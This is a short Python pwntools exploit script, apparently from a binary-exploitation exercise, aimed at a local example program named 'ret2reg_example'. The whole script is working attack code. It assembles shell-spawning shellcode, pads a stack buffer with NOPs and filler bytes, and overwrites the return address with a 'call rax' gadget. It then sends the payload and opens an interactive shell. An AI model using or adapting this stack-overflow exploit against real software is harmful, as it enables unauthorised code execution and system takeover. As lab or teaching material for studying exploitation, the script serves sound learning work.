import os
import pwn
import struct

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux'
)

target_info = {
	'exec_path': './ret2reg_example',
	'addr_len': 0x8,
	'bufvar2stack': 0x110,
	'shellcode': 0x0,
	'call_rax': 0x401010,
}

'''
| buufer            | caller rbp | callee return       |
| shellcode padding | padding    | [call *rax] address |
'''

shellcode_src = pwn.shellcraft.sh()
target_info['shellcode'] = pwn.asm(shellcode_src)

pwn.context.binary = pwn.ELF(target_info['exec_path'])
conn = pwn.process(target_info['exec_path'])

pwn.pause()

payload = target_info['shellcode']
payload += b'\x90' * (target_info['bufvar2stack'] - len(target_info['shellcode']))
payload += b'A' * target_info['addr_len']
payload += pwn.p64(target_info['call_rax'])

conn.sendlineafter(b'>>>>\n', payload)
conn.interactive()
